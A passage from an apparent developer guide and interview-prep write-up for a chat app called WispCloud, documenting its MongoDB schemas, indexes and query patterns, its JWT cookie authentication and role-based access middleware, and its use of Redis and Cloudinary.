```
socket.io#/#              - Main pub/sub channel
socket.io-request#/#      - Request/response pattern
socket.io-response#/#     - Response channel
```

**Monitoring:**
```bash
# See active subscriptions
redis-cli
> PUBSUB CHANNELS
> PUBSUB NUMSUB socket.io#/#
```

> **Interview Tip:** Explain horizontal scaling:
> - Without adapter: Each instance is isolated, can't communicate
> - With Redis adapter: All instances share event bus via pub/sub
> - Alternative: Sticky sessions (route same user to same instance) - simpler but less flexible
> - Production: Use Redis adapter + load balancer for best scalability

**Fallback:**
```javascript
try {
  await initializeSocketIO();
} catch (error) {
  console.warn('⚠️ Redis Adapter failed. Running in single-instance mode.');
  // Socket.IO still works, but only for single instance
}
```

---

## 4.5 Database Architecture

### Complete Schema for All 6 Models

#### 1. User Model

**File:** backend/src/models/user.model.js

**Schema Definition:**
```javascript
const userSchema = new mongoose.Schema(
  {
    email: {
      type: String,
      required: true,
      unique: true,           // Enforced by unique index
      lowercase: true,        // Auto-convert to lowercase
      trim: true,             // Remove whitespace
      index: true,            // Create index for fast lookups
    },

    username: {
      type: String,
      required: true,
      unique: true,
      lowercase: true,
      trim: true,
      minlength: 3,
      maxlength: 20,
      index: true,            // Index for username lookups
    },

    fullName: {
      type: String,
      required: true,
      trim: true,
    },

    password: {
      type: String,
      required: function() {
        // Password only required for local auth (not OAuth)
        return !this.authProvider || this.authProvider === 'local';
      },
      minlength: 6,
      select: false,          // Exclude from queries by default
    },

    profilePic: {
      type: String,
      default: "",            // Empty string if no profile pic
    },

    // OAuth fields
    authProvider: {
      type: String,
      enum: ['local', 'google'],
      default: 'local',
    },

    providerId: {
      type: String,
      sparse: true,           // Unique index that allows null
    },

    // Role-based access control
    role: {
      type: String,
      enum: ['user', 'moderator', 'admin'],
      default: 'user',
    },

    isActive: {
      type: Boolean,
      default: true,
    },

    lastSeen: {
      type: Date,
      default: Date.now,
    },
  },
  {
    timestamps: true,         // Auto-add createdAt, updatedAt
  }
);

// Additional indexes
userSchema.index({ createdAt: -1 });  // For sorting by join date
userSchema.index({ fullName: 'text', email: 'text', username: 'text' });  // Text search
```

**Purpose of Each Field:**
- `email`: Unique identifier for login
- `username`: Display name, must be unique
- `fullName`: User's real name
- `password`: Hashed password (bcrypt)
- `profilePic`: Cloudinary URL
- `authProvider`: 'local' (email/password) or 'google' (OAuth)
- `providerId`: Google ID (for OAuth users)
- `role`: Authorization level
- `isActive`: Account status (for bans)
- `lastSeen`: Last activity timestamp

**Example Document:**
```json
{
  "_id": ObjectId("507f1f77bcf86cd799439011"),
  "email": "john@example.com",
  "username": "johndoe",
  "fullName": "John Doe",
  "password": "$2a$10$X7yW...",  // Excluded by default (select: false)
  "profilePic": "https://res.cloudinary.com/wisp/image/upload/v1234/profile.jpg",
  "authProvider": "local",
  "providerId": null,
  "role": "user",
  "isActive": true,
  "lastSeen": ISODate("2025-01-15T10:30:00.000Z"),
  "createdAt": ISODate("2025-01-01T08:00:00.000Z"),
  "updatedAt": ISODate("2025-01-15T10:30:00.000Z")
}
```

#### 2. Message Model

**File:** backend/src/models/message.model.js

**Schema Definition:**
```javascript
const messageSchema = new mongoose.Schema(
  {
    senderId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
      index: true,
    },

    receiverId: {
      type: mongoose.Schema.Types.ObjectId,
      required: true,
      index: true,
      // Can be User (DM) or Group (group message)
    },

    isGroupMessage: {
      type: Boolean,
      default: false,
      index: true,
    },

    text: {
      type: String,
      trim: true,
    },

    image: {
      type: String,           // Cloudinary URL
    },

    replyTo: {
      type: mongoose.Schema.Types.ObjectId,
      ref: 'Message',
      default: null,
    },

    status: {
      type: String,
      enum: ['sent', 'delivered', 'read'],
      default: 'sent',
    },

    readAt: {
      type: Date,
    },

    // NLP/Recall fields (for future feature)
    entities: [{
      type: {
        type: String,
        enum: ['person', 'place', 'organization', 'topic', 'temporal'],
      },
      value: String,
      category: String,
    }],

    concepts: [{
      type: String,
    }],

    importance: {
      type: Number,
      min: 0,
      max: 100,
      default: 50,
      index: true,
    },

    sentiment: {
      type: String,
      enum: ['positive', 'negative', 'neutral'],
      default: 'neutral',
    },

    keywords: [{
      type: String,
    }],

    relatedMessages: [{
      type: mongoose.Schema.Types.ObjectId,
      ref: 'Message',
    }],

    processingVersion: {
      type: String,
      default: '1.0',
    },

    processedAt: {
      type: Date,
    },
  },
  {
    timestamps: true,
  }
);

// Compound indexes for efficient queries
messageSchema.index({ senderId: 1, receiverId: 1, createdAt: -1 });
messageSchema.index({ receiverId: 1, senderId: 1, createdAt: -1 });
messageSchema.index({ receiverId: 1, status: 1 });
messageSchema.index({ createdAt: -1 });
messageSchema.index({ receiverId: 1, isGroupMessage: 1, createdAt: -1 });

// Recall indexes
messageSchema.index({ concepts: 1 });
messageSchema.index({ 'entities.value': 1 });
messageSchema.index({ importance: -1, createdAt: -1 });
messageSchema.index({ keywords: 1 });
```

**Purpose:**
- Core message data: `text`, `image`
- Relationships: `senderId`, `receiverId`, `replyTo`
- Status tracking: `status`, `readAt`
- NLP fields: For future "Recall" feature (search conversations semantically)

**Example Documents:**

DM Message:
```json
{
  "_id": ObjectId("..."),
  "senderId": ObjectId("userId1"),
  "receiverId": ObjectId("userId2"),
  "isGroupMessage": false,
  "text": "Hey, how's the project going?",
  "image": null,
  "replyTo": null,
  "status": "read",
  "readAt": ISODate("2025-01-15T10:32:00.000Z"),
  "entities": [],
  "concepts": [],
  "importance": 50,
  "sentiment": "neutral",
  "keywords": [],
  "createdAt": ISODate("2025-01-15T10:30:00.000Z"),
  "updatedAt": ISODate("2025-01-15T10:32:00.000Z")
}
```

Group Message:
```json
{
  "_id": ObjectId("..."),
  "senderId": ObjectId("userId1"),
  "receiverId": ObjectId("groupId"),
  "isGroupMessage": true,
  "text": "Meeting at 3pm today",
  "image": null,
  "replyTo": ObjectId("previousMessageId"),
  "status": "sent",
  "readAt": null,
  "createdAt": ISODate("2025-01-15T10:30:00.000Z")
}
```

#### 3. Group Model

**File:** backend/src/models/group.model.js

**Schema Definition:**
```javascript
const groupSchema = new mongoose.Schema(
  {
    name: {
      type: String,
      required: true,
      trim: true,
      minlength: 3,
      maxlength: 50,
    },

    description: {
      type: String,
      trim: true,
      maxlength: 500,
    },

    groupImage: {
      type: String,
      default: "",
    },

    createdBy: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
      index: true,
    },

    type: {
      type: String,
      enum: ['public', 'private'],
      default: 'private',
    },

    maxMembers: {
      type: Number,
      default: 100,
      min: 2,
      max: 1000,
    },

    settings: {
      whoCanMessage: {
        type: String,
        enum: ['all', 'admins_only'],
        default: 'all',
      },
      whoCanAddMembers: {
        type: String,
        enum: ['all', 'admins_only', 'owner_only'],
        default: 'admins_only',
      },
      requireApproval: {
        type: Boolean,
        default: false,
      },
    },

    isActive: {
      type: Boolean,
      default: true,
    },

    stats: {
      totalMembers: {
        type: Number,
        default: 1,
      },
      totalMessages: {
        type: Number,
        default: 0,
      },
    },
  },
  {
    timestamps: true,
  }
);

// Indexes
groupSchema.index({ type: 1 });
groupSchema.index({ isActive: 1 });
groupSchema.index({ createdAt: -1 });
groupSchema.index({ name: 'text', description: 'text' });
```

**Purpose:**
- Group metadata: `name`, `description`, `groupImage`
- Ownership: `createdBy`
- Settings: Control who can perform actions
- Stats: Denormalized counts for performance

**Example Document:**
```json
{
  "_id": ObjectId("..."),
  "name": "Project Team",
  "description": "Discussion for Q1 2025 project",
  "groupImage": "https://res.cloudinary.com/.../group.jpg",
  "createdBy": ObjectId("ownerId"),
  "type": "private",
  "maxMembers": 100,
  "settings": {
    "whoCanMessage": "all",
    "whoCanAddMembers": "admins_only",
    "requireApproval": false
  },
  "isActive": true,
  "stats": {
    "totalMembers": 15,
    "totalMessages": 342
  },
  "createdAt": ISODate("2025-01-01T08:00:00.000Z"),
  "updatedAt": ISODate("2025-01-15T10:30:00.000Z")
}
```

#### 4. GroupMember Model

**File:** backend/src/models/groupMember.model.js

**Schema Definition:**
```javascript
const groupMemberSchema = new mongoose.Schema(
  {
    groupId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "Group",
      required: true,
      index: true,
    },

    userId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
      index: true,
    },

    role: {
      type: String,
      enum: ['owner', 'admin', 'member'],
      default: 'member',
    },

    nickname: {
      type: String,
      trim: true,
      maxlength: 30,
    },

    status: {
      type: String,
      enum: ['active', 'pending', 'banned', 'left'],
      default: 'active',
    },

    permissions: {
      canSendMessages: {
        type: Boolean,
        default: true,
      },
      canAddMembers: {
        type: Boolean,
        default: false,
      },
      canRemoveMembers: {
        type: Boolean,
        default: false,
      },
      canEditGroup: {
        type: Boolean,
        default: false,
      },
    },

    isMuted: {
      type: Boolean,
      default: false,
    },

    mutedUntil: {
      type: Date,
    },

    joinedAt: {
      type: Date,
      default: Date.now,
    },

    lastReadAt: {
      type: Date,
      default: Date.now,
    },
  },
  {
    timestamps: true,
  }
);

// Compound indexes
groupMemberSchema.index({ groupId: 1, userId: 1 }, { unique: true });
groupMemberSchema.index({ groupId: 1, status: 1 });
groupMemberSchema.index({ userId: 1, status: 1 });
groupMemberSchema.index({ groupId: 1, role: 1 });

// Pre-save middleware to set permissions based on role
groupMemberSchema.pre('save', function(next) {
  if (this.isModified('role')) {
    switch(this.role) {
      case 'owner':
        this.permissions = {
          canSendMessages: true,
          canAddMembers: true,
          canRemoveMembers: true,
          canEditGroup: true
        };
        break;
      case 'admin':
        this.permissions = {
          canSendMessages: true,
          canAddMembers: true,
          canRemoveMembers: true,
          canEditGroup: true
        };
        break;
      case 'member':
        this.permissions = {
          canSendMessages: true,
          canAddMembers: false,
          canRemoveMembers: false,
          canEditGroup: false
        };
        break;
    }
  }
  next();
});
```

**Purpose:**
- Join table: Links Users to Groups
- Role & permissions: Control access
- Status: Track membership state
- Personalization: `nickname`, `isMuted`

**Example Document:**
```json
{
  "_id": ObjectId("..."),
  "groupId": ObjectId("groupId"),
  "userId": ObjectId("userId"),
  "role": "admin",
  "nickname": "Johnny",
  "status": "active",
  "permissions": {
    "canSendMessages": true,
    "canAddMembers": true,
    "canRemoveMembers": true,
    "canEditGroup": true
  },
  "isMuted": false,
  "mutedUntil": null,
  "joinedAt": ISODate("2025-01-02T09:00:00.000Z"),
  "lastReadAt": ISODate("2025-01-15T10:25:00.000Z"),
  "createdAt": ISODate("2025-01-02T09:00:00.000Z"),
  "updatedAt": ISODate("2025-01-10T14:00:00.000Z")
}
```

#### 5. ChatInvite Model

**File:** backend/src/models/chatInvite.model.js

**Schema Definition:**
```javascript
const chatInviteSchema = new mongoose.Schema(
  {
    senderId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
      index: true,
    },

    receiverId: {
      type: mongoose.Schema.Types.ObjectId,
      ref: "User",
      required: true,
      index: true,
    },

    status: {
      type: String,
      enum: ["pending", "accepted", "rejected"],
      default: "pending",
      index: true,
    },
  },
  { timestamps: true }
);

// Compound indexes
chatInviteSchema.index({ senderId: 1, receiverId: 1 });
chatInviteSchema.index({ receiverId: 1, status: 1 });
```

**Purpose:**
- Friend request system
- Privacy: Users must accept before DMing
- Prevents spam

**Example Document:**
```json
{
  "_id": ObjectId("..."),
  "senderId": ObjectId("user1"),
  "receiverId": ObjectId("user2"),
  "status": "accepted",
  "createdAt": ISODate("2025-01-10T12:00:00.000Z"),
  "updatedAt": ISODate("2025-01-10T12:05:00.000Z")
}
```

#### 6. Concept Model (Future Feature)

**File:** backend/src/models/concept.model.js

**Purpose:** Store extracted concepts from messages for semantic search (Recall feature)

**Schema** (Simplified):
```javascript
const conceptSchema = new mongoose.Schema({
  value: {
    type: String,
    required: true,
    index: true
  },
  category: String,
  messages: [{
    type: mongoose.Schema.Types.ObjectId,
    ref: 'Message'
  }],
  frequency: {
    type: Number,
    default: 1
  }
}, { timestamps: true });
```

**Use Case:**
- User searches: "When did we discuss deployment?"
- System finds Concept: "deployment"
- Returns all messages related to that concept

### All Indexes Documented (15+ Total)

**User Collection:**
1. `{ email: 1 }` - UNIQUE - Fast login lookups
2. `{ username: 1 }` - UNIQUE - Username lookups, uniqueness
3. `{ createdAt: -1 }` - Sort users by join date (analytics)
4. `{ fullName: "text", email: "text", username: "text" }` - TEXT - Search users

**Message Collection:**
5. `{ senderId: 1, receiverId: 1, createdAt: -1 }` - COMPOUND - Fetch conversation (user A → user B)
6. `{ receiverId: 1, senderId: 1, createdAt: -1 }` - COMPOUND - Reverse direction (user B → user A)
7. `{ receiverId: 1, status: 1 }` - COMPOUND - Find unread messages for user
8. `{ createdAt: -1 }` - Sort messages by time
9. `{ receiverId: 1, isGroupMessage: 1, createdAt: -1 }` - COMPOUND - Group messages
10. `{ concepts: 1 }` - Search by extracted concepts (Recall)
11. `{ entities.value: 1 }` - Search by entities (Recall)
12. `{ importance: -1, createdAt: -1 }` - COMPOUND - Most important messages (Recall)
13. `{ keywords: 1 }` - Keyword search (Recall)

**Group Collection:**
14. `{ createdBy: 1 }` - Find groups by creator
15. `{ type: 1 }` - Filter public/private groups
16. `{ isActive: 1 }` - Filter active groups
17. `{ createdAt: -1 }` - Sort by creation date
18. `{ name: "text", description: "text" }` - TEXT - Search groups

**GroupMember Collection:**
19. `{ groupId: 1, userId: 1 }` - UNIQUE COMPOUND - Prevent duplicate memberships
20. `{ groupId: 1, status: 1 }` - COMPOUND - Find active members of group
21. `{ userId: 1, status: 1 }` - COMPOUND - Find user's active groups
22. `{ groupId: 1, role: 1 }` - COMPOUND - Find admins/owners of group

**ChatInvite Collection:**
23. `{ senderId: 1, receiverId: 1 }` - COMPOUND - Check existing invite
24. `{ receiverId: 1, status: 1 }` - COMPOUND - Find pending invites for user

**Why So Many Indexes?**

> **Interview Answer:** "Indexes are crucial for performance at scale. Without indexes, MongoDB does a collection scan (O(n)). With indexes, lookups are O(log n) with B-trees. We created indexes for every common query pattern:
> - Login: email index (millions of users, need <10ms login)
> - Messages: compound indexes for conversations (fetch 100 messages instantly)
> - Groups: member lookups (hundreds of groups per user)
> - Read receipts: status index (find unread efficiently)
>
> Trade-off: Indexes use disk space and slow down writes. But for a chat app, reads >>> writes, so it's worth it. We monitor index usage with MongoDB explain() and remove unused indexes."

### Relationships Diagram (ASCII)

```
┌─────────────────────────────────────────────────────────────────────┐
│                         WispCloud Database Schema                    │
└─────────────────────────────────────────────────────────────────────┘

                            User
                             │
                             │ createdBy
                 ┌───────────┼───────────┐
                 │           │           │
                 ↓           ↓           ↓
              Group    ChatInvite    Message
                 │     (senderId,    (senderId)
                 │     receiverId)        │
                 │                        │
                 ↓                        ↓
          GroupMember                 Message
          (groupId,                 (receiverId)
           userId)                       │
                                         │
                                         ↓
                                  User or Group


Relationships in Detail:

1. User → Group (1:many via GroupMember)
   - A user can be in many groups
   - Relationship: User._id = GroupMember.userId

2. User → Group (1:many as creator)
   - A user can create many groups
   - Relationship: User._id = Group.createdBy

3. Group → GroupMember (1:many)
   - A group has many members
   - Relationship: Group._id = GroupMember.groupId

4. User → Message (1:many as sender)
   - A user can send many messages
   - Relationship: User._id = Message.senderId

5. User → Message (1:many as receiver for DMs)
   - A user can receive many DMs
   - Relationship: User._id = Message.receiverId
   - Condition: Message.isGroupMessage = false

6. Group → Message (1:many for group messages)
   - A group can have many messages
   - Relationship: Group._id = Message.receiverId
   - Condition: Message.isGroupMessage = true

7. Message → Message (1:many for replies)
   - A message can be replied to by many messages
   - Relationship: Message._id = Message.replyTo
   - Self-referential

8. User ↔ User (many:many via ChatInvite)
   - Users can send invites to each other
   - Relationship: ChatInvite (senderId, receiverId)
   - Junction pattern

Cardinalities:

User (1) ──< GroupMember >── (many) Group
User (1) ──< Message (many) [as sender]
User (1) ──< Message (many) [as DM receiver]
Group (1) ──< Message (many) [as group receiver]
Message (1) ──< Message (many) [as reply chain]
User (many) ──< ChatInvite >── (many) User
```

**Entity-Relationship Summary:**

| Entity | Relationship | Entity | Type | Junction Table |
|--------|--------------|--------|------|----------------|
| User | creates | Group | 1:Many | - |
| User | member of | Group | Many:Many | GroupMember |
| User | sends | Message | 1:Many | - |
| User | receives DM | Message | 1:Many | - |
| Group | has | Message | 1:Many | - |
| Message | reply to | Message | 1:Many (self) | - |
| User | invites | User | Many:Many | ChatInvite |

### Query Patterns with Examples

**1. Get Conversation Between Two Users**

```javascript
// MongoDB query
const messages = await Message.find({
  $or: [
    { senderId: user1Id, receiverId: user2Id },
    { senderId: user2Id, receiverId: user1Id }
  ]
})
  .sort({ createdAt: -1 })
  .limit(50);

// Uses index: { senderId: 1, receiverId: 1, createdAt: -1 }
// Explain plan: IXSCAN (index scan)
// Performance: O(log n) + 50 documents
```

**2. Get User's Groups**

```javascript
// Step 1: Find memberships
const memberships = await GroupMember.find({
  userId: userId,
  status: 'active'
});

// Step 2: Extract group IDs
const groupIds = memberships.map(m => m.groupId);

// Step 3: Fetch groups
const groups = await Group.find({
  _id: { $in: groupIds }
})
  .populate('createdBy', 'username profilePic');

// Alternative: Use populate on memberships
const memberships = await GroupMember.find({
  userId: userId,
  status: 'active'
})
  .populate({
    path: 'groupId',
    populate: { path: 'createdBy', select: 'username profilePic' }
  });

// Uses indexes:
// - { userId: 1, status: 1 } on GroupMember
// - { _id: 1 } on Group (default)
```

**3. Get Group Messages**

```javascript
const messages = await Message.find({
  receiverId: groupId,
  isGroupMessage: true
})
  .sort({ createdAt: -1 })
  .limit(50)
  .populate('senderId', 'username fullName profilePic');

// Uses index: { receiverId: 1, isGroupMessage: 1, createdAt: -1 }
```

**4. Find Unread Messages**

```javascript
const unreadCount = await Message.countDocuments({
  receiverId: userId,
  status: { $ne: 'read' }
});

// Uses index: { receiverId: 1, status: 1 }
```

**5. Mark Messages as Read**

```javascript
const result = await Message.updateMany(
  {
    senderId: senderId,
    receiverId: userId,
    status: { $ne: 'read' }
  },
  {
    $set: {
      status: 'read',
      readAt: new Date()
    }
  }
);

// Uses index: { receiverId: 1, status: 1 }
// Returns: { modifiedCount: 5 }
```

**6. Check if Users are Connected (have accepted invite)**

```javascript
const invite = await ChatInvite.findOne({
  $or: [
    { senderId: user1Id, receiverId: user2Id, status: 'accepted' },
    { senderId: user2Id, receiverId: user1Id, status: 'accepted' }
  ]
});

const areConnected = !!invite;

// Uses index: { senderId: 1, receiverId: 1 }
```

**7. Get Pending Invites for User**

```javascript
const pendingInvites = await ChatInvite.find({
  receiverId: userId,
  status: 'pending'
})
  .populate('senderId', 'username fullName profilePic')
  .sort({ createdAt: -1 });

// Uses index: { receiverId: 1, status: 1 }
```

**8. Get Group Members with Roles**

```javascript
const members = await GroupMember.find({
  groupId: groupId,
  status: 'active'
})
  .populate('userId', 'username fullName profilePic')
  .sort({ role: 1, joinedAt: 1 });  // Owner first, then admins, then members

// Uses index: { groupId: 1, status: 1 }
```

**9. Search Users**

```javascript
const users = await User.find({
  $text: { $search: searchQuery }
})
  .select('username fullName email profilePic')
  .limit(20);

// Uses index: { fullName: "text", email: "text", username: "text" }
```

**10. Analytics: Messages Per Day (Last 7 Days)**

```javascript
const sevenDaysAgo = new Date();
sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);

const messageStats = await Message.aggregate([
  {
    $match: {
      createdAt: { $gte: sevenDaysAgo }
    }
  },
  {
    $group: {
      _id: {
        $dateToString: { format: "%Y-%m-%d", date: "$createdAt" }
      },
      count: { $sum: 1 }
    }
  },
  {
    $sort: { _id: 1 }
  }
]);

// Result: [ { _id: "2025-01-10", count: 152 }, ... ]
// Uses index: { createdAt: -1 }
```

> **Interview Tip:** When asked about database optimization:
> 1. **Indexes**: Show you understand compound indexes and query patterns
> 2. **Population**: Explain MongoDB's populate vs SQL JOINs
> 3. **Aggregation**: Demonstrate complex queries for analytics
> 4. **Denormalization**: Explain why we store `stats.totalMembers` in Group (avoid count query on every request)
> 5. **Pagination**: Use cursor-based (better than offset/limit for large datasets)

---

*[Chapter 4 Complete - Total: ~400 lines for 4.1, ~500 lines for 4.2, ~600 lines for 4.3, ~400 lines for 4.4, ~500 lines for 4.5 = ~2,400 lines]*


# **CHAPTER 5: CRITICAL IMPLEMENTATIONS**

*This chapter provides complete, line-by-line analysis of the most important code implementations in WispCloud. Each section includes full source code with detailed explanations.*

---

## **5.1 Authentication & Authorization System**

> **Key Concept:** WispCloud implements a **JWT-based stateless authentication** system with **HTTP-only cookies** for token storage, combined with a **role-based access control (RBAC)** system for fine-grained permissions.

### **5.1.1 JWT Middleware - Complete Implementation**

**File:** `C:\Users\Nilansh\Desktop\WispCloud\backend\src\middleware\auth.middleware.js`

```javascript
import jwt from "jsonwebtoken";
import User from "../models/user.model.js";

export const protectRoute = async (req, res, next) => {
    try {
        // Step 1: Extract JWT token from HTTP-only cookie
        const token = req.cookies.jwt;

        // Step 2: Validate token exists
        if (!token) {
            return res.status(401).json({
                message: "Unauthorized - No Token Provided"
            });
        }

        // Step 3: Verify token signature and decode payload
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Step 4: Validate decoded token structure
        if (!decoded) {
            return res.status(401).json({
                message: "Unauthorized - Invalid Token"
            });
        }

        // Step 5: Fetch user from database (without password field)
        const user = await User.findById(decoded.userId).select("-password");

        // Step 6: Verify user still exists
        if (!user) {
            return res.status(404).json({
                message: "User not found"
            });
        }

        // Step 7: Attach user object to request for downstream handlers
        req.user = user;

        // Step 8: Pass control to next middleware/controller
        next();

    } catch (error) {
        console.log("Error in protectRoute middleware", error.message);
        res.status(500).json({
            message: "Internal server error"
        });
    }
};
```

**Line-by-Line Breakdown:**

1. **Lines 1-2:** Import dependencies (jsonwebtoken for JWT verification, User model for database lookups)
2. **Line 6:** Extract JWT from `req.cookies.jwt` - token stored in HTTP-only cookie (prevents XSS attacks)
3. **Lines 9-12:** First validation - ensure token exists (401 if missing)
4. **Line 15:** **Critical:** `jwt.verify()` validates signature using `JWT_SECRET` and decodes payload
5. **Lines 18-22:** Second validation - ensure decoded payload is valid
6. **Line 25:** Fetch user from MongoDB, explicitly excluding password field with `.select("-password")`
7. **Lines 28-32:** Third validation - ensure user hasn't been deleted from database
8. **Line 35:** **Key Step:** Attach user object to `req.user` for use in controllers
9. **Line 38:** Call `next()` to proceed to protected route handler

> **Interview Tip:** When explaining this middleware:
> - **Stateless Authentication:** Token contains user ID; no server-side session storage
> - **Three-Layer Validation:** Token exists → Token valid → User exists
> - **Security Features:** HTTP-only cookie (XSS protection), signed JWT (tampering protection)
> - **Database Query:** Every request validates user still exists (handles deleted users)

### **5.1.2 JWT Token Generation**

**File:** `C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\utils.js`

```javascript
import jwt from "jsonwebtoken"

export const generateToken = (userId, res) => {
    // Step 1: Create JWT payload with user ID
    const token = jwt.sign(
        { userId },                      // Payload
        process.env.JWT_SECRET,          // Secret key for signing
        { expiresIn: "7d" }              // Token expires in 7 days
    );

    // Step 2: Set token as HTTP-only cookie
    res.cookie("jwt", token, {
        maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days in milliseconds
        httpOnly: true,                    // Prevents XSS attacks
        sameSite: "strict",                // CSRF protection
        secure: process.env.NODE_ENV !== "development"  // HTTPS in production
    });

    return token;
};
```

**Security Analysis:**

| Security Feature | Implementation | Protection Against |
|------------------|----------------|---------------------|
| **HTTP-Only** | `httpOnly: true` | XSS attacks (JavaScript cannot access cookie) |
| **SameSite** | `sameSite: "strict"` | CSRF attacks (cookie not sent on cross-site requests) |
| **Secure Flag** | `secure: true` (production) | Man-in-the-middle attacks (HTTPS only) |
| **Expiration** | `expiresIn: "7d"` | Token replay attacks (limited time window) |
| **Signed JWT** | `jwt.sign()` with secret | Tampering (signature verification required) |

### **5.1.3 RBAC Middleware - Complete Implementation**

**File:** `C:\Users\Nilansh\Desktop\WispCloud\backend\src\middleware\rbac.middleware.js`

```javascript
/**
 * Role-Based Access Control Middleware
 */

// Check if user has required role
export const checkRole = (...allowedRoles) => {
    return (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({
                message: 'Unauthorized - No user found'
            });
        }

        if (!allowedRoles.includes(req.user.role)) {
            return res.status(403).json({
                message: 'Forbidden - Insufficient permissions',
                requiredRole: allowedRoles,
                userRole: req.user.role
            });
        }

        next();
    };
};

// Require admin role
export const requireAdmin = checkRole('admin');

// Require moderator or admin role
export const requireModerator = checkRole('moderator', 'admin');

// Check if user is active
export const checkActive = (req, res, next) => {
    if (!req.user) {
        return res.status(401).json({
            message: 'Unauthorized - No user found'
        });
    }

    if (!req.user.isActive) {
        return res.status(403).json({
            message: 'Account is inactive. Please contact support.'
        });
    }

    next();
};

// Check if user owns the resource or is admin
export const checkOwnershipOrAdmin = (resourceUserIdField = 'userId') => {
    return (req, res, next) => {
        const resourceUserId = req.params[resourceUserIdField] ||
                               req.body[resourceUserIdField];

        if (!req.user) {
            return res.status(401).json({
                message: 'Unauthorized - No user found'
            });
        }

        // Allow if user is admin or owns the resource
        if (req.user.role === 'admin' ||
            req.user._id.toString() === resourceUserId) {
            return next();
        }

        return res.status(403).json({
            message: 'Forbidden - You can only access your own resources'
        });
    };
};

// Permission definitions
export const PERMISSIONS = {
    // User permissions
    READ_USERS: ['user', 'moderator', 'admin'],
    UPDATE_OWN_PROFILE: ['user', 'moderator', 'admin'],
    UPDATE_ANY_PROFILE: ['admin'],
    DELETE_OWN_ACCOUNT: ['user', 'moderator', 'admin'],
    DELETE_ANY_ACCOUNT: ['admin'],

    // Message permissions
    SEND_MESSAGES: ['user', 'moderator', 'admin'],
    DELETE_OWN_MESSAGES: ['user', 'moderator', 'admin'],
    DELETE_ANY_MESSAGES: ['moderator', 'admin'],

    // Chat invite permissions
    SEND_INVITES: ['user', 'moderator', 'admin'],
    MANAGE_INVITES: ['user', 'moderator', 'admin'],

    // Admin permissions
    MANAGE_USERS: ['admin'],
    MANAGE_ROLES: ['admin'],
    VIEW_ANALYTICS: ['moderator', 'admin'],
};

// Check if user has specific permission
export const hasPermission = (permission) => {
    return (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({
                message: 'Unauthorized - No user found'
            });
        }

        const allowedRoles = PERMISSIONS[permission];

        if (!allowedRoles || !allowedRoles.includes(req.user.role)) {
            return res.status(403).json({
                message: 'Forbidden - Insufficient permissions',
                permission,
                userRole: req.user.role
            });
        }

        next();
    };
};
```

**RBAC Architecture Explanation:**

**1. Role Hierarchy:**
```
┌─────────────────────────────────────┐
│           ADMIN (Full Access)        │
│  - All permissions                   │
│  - Can modify any resource           │
│  - Can manage users & roles          │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│      MODERATOR (Content Mgmt)        │
│  - Delete any messages               │
│  - View analytics                    │
│  - Cannot manage users/roles         │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│         USER (Basic Access)          │
│  - Send messages                     │
│  - Manage own profile                │
│  - Send/accept invites               │
└──────────────────────────────────────┘
```

**2. Permission Checking Flow:**
```
Request
   ↓
protectRoute() → Validates JWT → Attaches req.user
   ↓
checkRole() or hasPermission() → Validates user.role
   ↓
Route Handler (if authorized)
```

**3. Usage Examples:**

```javascript
// Require admin role
router.delete('/users/:id', protectRoute, requireAdmin, deleteUser);

// Require moderator or admin
router.get('/analytics', protectRoute, requireModerator, getAnalytics);

// Check specific permission
router.delete('/messages/:id',
    protectRoute,
    hasPermission('DELETE_ANY_MESSAGES'),
    deleteMessage
);

// Check ownership or admin
router.put('/profile/:userId',
    protectRoute,
    checkOwnershipOrAdmin('userId'),
    updateProfile
);
```

> **Why This Matters:** RBAC provides:
> - **Scalability:** Easy to add new roles/permissions
> - **Security:** Fine-grained access control
> - **Maintainability:** Centralized permission definitions
> - **Flexibility:** Multiple middleware can be chained



# **CHAPTER 6: THIRD-PARTY INTEGRATIONS**

---

## **6.1 Cloudinary (Media Storage)**

### **6.1.1 What is Cloudinary?**

Cloudinary is a cloud-based **image and video management** service that provides:
- **Storage:** Secure cloud storage for media files
- **Transformation:** On-the-fly image resizing, cropping, optimization
- **CDN Delivery:** Fast global content delivery
- **Upload API:** Easy integration for file uploads

### **6.1.2 Why Cloudinary for WispCloud?**

**Decision Factors:**

| Feature | Cloudinary | AWS S3 | Local Storage |
|---------|-----------|--------|---------------|
| **Setup Complexity** | ✅ Simple (2-line config) | ❌ Complex (IAM, buckets) | ✅ Simple |
| **Transformations** | ✅ Built-in | ❌ Requires Lambda | ❌ Not available |
| **CDN** | ✅ Included | ❌ Separate CloudFront | ❌ Not available |
| **Free Tier** | ✅ 25GB storage | ✅ 5GB storage | ✅ Unlimited |
| **Scalability** | ✅ Automatic | ✅ Automatic | ❌ Manual scaling |
| **Cost** | ✅ Generous free tier | ❌ Pay-as-you-go | ✅ Server storage only |

**Chosen: Cloudinary** because:
1. **Minimal setup** (perfect for MVP)
2. **Image transformations** included
3. **CDN delivery** for fast loading
4. **Generous free tier** (25GB storage, 25GB bandwidth/month)

### **6.1.3 Implementation**

**File:** `C:\Users\Nilansh\Desktop\WispCloud\backend\src\lib\cloudinary.js`

```javascript
import { v2 as cloudinary } from "cloudinary";
import { config } from 'dotenv';

config();

cloudinary.config({
    cloud_name: process.env.CLOUDINARY_CLOUD_NAME,
    api_key: process.env.CLOUDINARY_API_KEY,
    api_secret: process.env.CLOUDINARY_API_SECRET,
});

export default cloudinary;
```

**Upload Flow:**

```
Frontend (React)
   ↓
1. User selects image file
   ↓
2. Convert to Base64 string
   ↓
3. Send to backend: POST /api/auth/update-profile
   ↓
Backend (Express)
   ↓
4. Receive Base64 image in req.body.profilePic
   ↓
5. Upload to Cloudinary
   cloudinary.uploader.upload(profilePic)
   ↓
6. Cloudinary returns secure_url
   ↓
7. Save secure_url to MongoDB
   ↓
8. Return updated user object
```

**Example Upload Code:**

